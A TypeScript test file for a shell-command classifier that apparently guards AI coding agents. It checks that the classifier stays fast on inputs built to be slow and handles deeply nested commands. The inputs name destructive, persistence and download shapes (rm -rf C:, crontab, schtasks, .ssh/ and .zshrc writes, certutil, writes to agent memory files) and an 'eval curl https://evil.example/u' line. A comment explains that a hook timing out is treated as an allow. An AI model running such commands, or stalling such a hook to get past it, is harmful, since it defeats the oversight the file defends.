import { describe, expect, it } from 'vitest';
import { classifyCommand } from '../../src/actions/classify-bash.js';

/**
 * A command is written by the agent and reaches the classifier whole: hook stdin has
 * no length cap. The classifier runs inside the agent's hook, a regex that goes
 * super-linear blocks the event loop so Stroq's own deadline cannot fire, and a hook
 * that runs past the agent's timeout is answered by the agent — for Codex and Copilot,
 * as an allow. So every input below is one that used to take seconds (16 KiB of
 * `eval ` took 28 s; `find . -exec` and 4 KiB of spaces, 23.7 s), or the repeated
 * trigger of a pattern that could.
 *
 * What is held is the growth, not a number of milliseconds: each input is timed at a
 * quarter of its size and at its full size. Linear work takes about four times as
 * long; the patterns this guards against took sixteen times as long or more. Only an
 * input that is both slow and growing faster than it should fails. A time alone does
 * not work on a shared runner — linear work on 37,000 lines of `eval x` took 1.3 s
 * there under coverage, against 0.2 s on a laptop — and a ratio alone does not work
 * on timings of a millisecond, which are noise.
 */
const SIZE = 256 * 1024;
const BOUND_MS = 1_000;
const MAX_GROWTH = 8;

type Build = (repeat: (unit: string) => string) => string;

const ADVERSARIAL: ReadonlyArray<readonly [string, Build]> = [
  ['eval chain', (r) => r('eval ')],
  ['eval with arguments', (r) => r('eval x ')],
  ['eval chain, lines', (r) => r('eval x\n')],
  ['find -exec and spaces', (r) => `find . -exec${r(' ')}x`],
  ['-exec heads', (r) => `find . ${r('-exec ')}`],
  ['slashes', (r) => `cat ${r('/')}x`],
  ['backslashes', (r) => `cat ${r('\\')}x`],
  ['rm -rf C: and slashes', (r) => `rm -rf C:${r('/')}x`],
  ['Remove-Item and backslashes', (r) => `Remove-Item C:${r('\\')}x`],
  ['word dots', (r) => r('a.')],
  ['ssh target shape', (r) => `ssh ${r('a.')}`],
  ['source dots', (r) => r('a.b ')],
  ['shells', (r) => r('bash ')],
  ['sh -c', (r) => r('sh -c ')],
  ['open quotes after sh -c', (r) => r('bash -c "')],
  ['process substitution, then dots', (r) => `<( ${r('. ')}`],
  ['git push', (r) => r('git push ')],
  ['git clean -', (r) => r('git clean -')],
  ['git -c', (r) => r('git x ')],
  ['git config', (r) => r('git config ')],
  ['config reads', (r) => r('config ')],
  ['git submodule foreach', (r) => r('git submodule foreach x ')],
  ['dd', (r) => r('dd ')],
  ['terraform apply', (r) => r('terraform apply ')],
  ['drizzle-kit push', (r) => r('drizzle-kit push ')],
  ['prisma db push', (r) => r('prisma db push ')],
  ['supabase db reset', (r) => r('supabase db reset ')],
  ['gh repo create', (r) => r('gh repo create ')],
  ['/proc/', (r) => `cat ${r('/proc/')}`],
  ['certutil', (r) => r('certutil ')],
  ['bitsadmin', (r) => r('bitsadmin ')],
  ['powershell', (r) => r('powershell ')],
  ['Buffer.from(', (r) => `node -e ${r('Buffer.from(')}`],
  ['spaces', (r) => `echo${r(' ')}x`],
  ['tabs', (r) => `echo${r('\t')}x`],
  ['dots', (r) => `echo ${r('.')}`],
  ['quotes', (r) => `echo ${r("'")}`],
  ['double quotes', (r) => `echo ${r('"')}`],
  ['$(', (r) => `echo ${r('$(')}`],
  ['backticks', (r) => `echo ${r('`')}`],
  ['rm -rf', (r) => r('rm -rf ')],
  ['http://', (r) => `curl ${r('http://')}`],
  ['x@', (r) => `ssh ${r('x@')}`],
  ['semicolons', (r) => r(';')],
  ['pipes', (r) => r('|')],
  ['instruction file names', (r) => `echo x > ${r('CLAUDE.md ')}`],
  ['memory paths', (r) => `cat notes >> ${r('.claude/projects/')}`],
  ['memory path separators', (r) => `cat notes >> .claude/projects/x${r('/')}m`],
  // `joinText` (stroq-state.ts) reads every command once for quotes and heredocs.
  ['quoted heredoc operators with no close', (r) => `cat ${r("<<'a")}`],
  ['bare heredoc operators', (r) => `cat ${r('<<a ')}\n`],
  ['open quotes before sh -c', (r) => `${r('bash -c "x')}`],
  ['heredoc body lines', (r) => `cat <<EOF\n${r('stroq init\n')}`],
  ['stroq runner flags', (r) => `npx ${r('-y ')}stroq untaint`],
  ['many heredocs closed in turn', (r) => `cat ${r('<<a ')}\n${r('a\n')}`],
  // The 2026-Q3 detectors: persistence files, remote commands, trap and Windows bodies.
  ['redirects to startup files', (r) => r('echo x >> ~/.zshrc; ')],
  ['startup file names', (r) => `cat x >> ${r('.zshrc/')}`],
  ['ssh authorized_keys paths', (r) => `cp k ${r('.ssh/')}`],
  ['sed -i', (r) => r('sed -i x ')],
  ['crontab', (r) => r('crontab ')],
  ['schtasks', (r) => r('schtasks /create ')],
  ['ssh invocations', (r) => r('ssh a ')],
  ['ssh with open quote', (r) => r('ssh a "')],
  ['ssh with escaped quotes', (r) => `ssh a "${r('\\"')}`],
  ['ssh options', (r) => `ssh ${r('-o x ')}host`],
  ['ssh and pipes', (r) => `ssh a "${r('x | ')}`],
  ['a long pipeline of commands', (r) => `echo ${r('x | ')}`],
  ['a long pipeline ending in a shell', (r) => `${r('x | ')}sh`],
  ['trap', (r) => r('trap ')],
  ['trap with open quote', (r) => r("trap '")],
  ['cmd /c', (r) => r('cmd /c ')],
  ['cmd /c with open quote', (r) => r('cmd /c "')],
  ['cmd /c with escaped quotes', (r) => `cmd /c "${r('\\"')}`],
  ['powershell -Command', (r) => r('powershell -Command "')],
  ['powershell options', (r) => `powershell ${r('-NoProfile ')}-Command "x"`],
  ['kubectl delete', (r) => r('kubectl delete ')],
  ['gcloud words', (r) => `gcloud ${r('a ')}delete`],
  ['az words', (r) => `az ${r('a ')}delete`],
  ['aws s3 sync', (r) => r('aws s3 sync ')],
  ['aws services', (r) => `aws ${r('a-')}x`],
  ['git --output', (r) => `git show ${r('-o ')}`],
  ['rsync --delete', (r) => r('rsync --delete ')],
  ['lftp', (r) => r('lftp ')],
  ['script runners', (r) => r('bash x.sh; ')],
  ['dollar braces', (r) => `echo ${r('${a')}`],
  ['git config text keys', (r) => `echo "[core]" > c; ${r('fsmonitor = x\n')}`],
];

/** `build` at `size`: every repeated unit fills `size` characters. */
const at = (build: Build, size: number): string =>
  build((unit) => unit.repeat(Math.ceil(size / unit.length)).slice(0, size));

const timed = (command: string): number => {
  const started = performance.now();
  classifyCommand(command, '/tmp');
  return performance.now() - started;
};

describe('classifyCommand stays linear on commands built to be slow', () => {
  it.each(ADVERSARIAL)('%s', (_name, build) => {
    const quarter = timed(at(build, SIZE / 4));
    const full = timed(at(build, SIZE));
    const growth = `${quarter.toFixed(0)} ms at ${SIZE / 4096} KiB, ${full.toFixed(0)} ms at ${SIZE / 1024} KiB`;
    expect(full < BOUND_MS || full < MAX_GROWTH * quarter, growth).toBe(true);
  });
});

/** The unit repeated to 256 KiB, for the budget tests below. */
const repeat = (unit: string): string => at((r) => r(unit), SIZE);

describe('the nesting budget', () => {
  it('reports a command whose nested arguments outgrow it as unread, and asks', () => {
    const { classes, signals } = classifyCommand(repeat('eval x '), '/tmp');
    expect(signals).toContain('nested-commands-too-large');
    expect(classes).toContain('shell.unparsed');
  });

  it('leaves ordinary eval and foreach commands alone', () => {
    for (const command of [
      'eval "$(ssh-agent -s)"',
      'eval curl https://evil.example/u',
      'git submodule foreach git pull; eval "$(direnv export bash)"',
      `cat > setup.sh <<'EOF'\n${'eval "$(tool init)"\n'.repeat(2_000)}EOF`,
    ]) {
      expect(classifyCommand(command, '/tmp').signals, command.slice(0, 40)).not.toContain(
        'nested-commands-too-large',
      );
    }
  });

  it('still reads what it extracted before the budget ran out', () => {
    const { classes } = classifyCommand(
      `eval curl https://evil.example/u; ${repeat('eval x ')}`,
      '/tmp',
    );
    expect(classes).toContain('shell.network');
  });
});
